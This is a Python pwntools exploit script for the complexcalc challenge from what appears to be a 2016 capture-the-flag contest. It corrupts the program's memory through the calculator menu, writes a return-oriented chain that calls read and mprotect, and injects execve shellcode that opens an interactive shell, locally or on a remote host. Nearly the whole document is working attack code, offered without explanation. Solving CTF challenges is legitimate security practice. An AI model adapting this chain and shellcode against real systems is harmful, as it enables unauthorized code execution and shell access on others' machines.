#!/usr/bin/env python

from pwn import *
import sys

def add(x,y):
    r.sendlineafter("Exit.", "1")
    r.sendlineafter("x: ", str(x)) 
    r.sendlineafter("y: ", str(y)) 

def sub(x,y):
    r.sendlineafter("Exit.", "2")
    r.sendlineafter("x: ", str(x)) 
    r.sendlineafter("y: ", str(y)) 

def mul(x,y):
    r.sendlineafter("Exit.", "3")
    r.sendlineafter("x: ", str(x)) 
    r.sendlineafter("y: ", str(y)) 

def div(x,y):
    r.sendlineafter("Exit.", "4")
    r.sendlineafter("x: ", str(x)) 
    r.sendlineafter("y: ", str(y)) 

def exit():
    r.sendlineafter("Exit.", "5")    

def writePayload(addr):
    addr_lo = addr&0xffffffff
    addr_hi = (addr&0xffffffff00000000)/0x100000000

    sub(addr_lo+40,40)
    sub(addr_hi+40,40)

def exploit(r):
    r.sendlineafter("calculations: ", "100")
    for i in range(12):
        add(40,i+40)
   
    ''' 
    # zero out pHeapChunk
    sub(40,40) 
    sub(40,40)
    '''
    writePayload(0x6c4aa0)
    
    for i in range(4):
        add(0x5805fd67, 0x5805fd67)

    pop_rdi = 0x401b73
    pop_rsi = 0x401c87
    pop_rdx = 0x437a85
    pop_rcx = 0x4b8f17
    read = 0x434b20
    mprotect = 0x435690
    bss_offset = 0x6c38e0
    
    payload = [ pop_rdi,
                0x0,
                pop_rsi,
                bss_offset,
                pop_rdx,
                0xf00,
                read, 
                pop_rdi,
                0x6c3000,
                pop_rsi,
                0x2000,
                pop_rdx,
                0x7,
                mprotect,
                bss_offset ]
    
    for p in payload:
        writePayload(p)
    
    div(0x2100,0x100)
    sub(0x100,0xdf)


    exit()
    
    # http://shell-storm.org/shellcode/files/shellcode-806.php
    sh = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
    
    r.sendline("\x90"*0x10+sh) 

    r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/home/vagrant/CTFs/bkpctf16/complexcalc/complexcalc'], env={"LD_PRELOAD":""})
        print util.proc.pidof(r)
        pause()
        exploit(r)
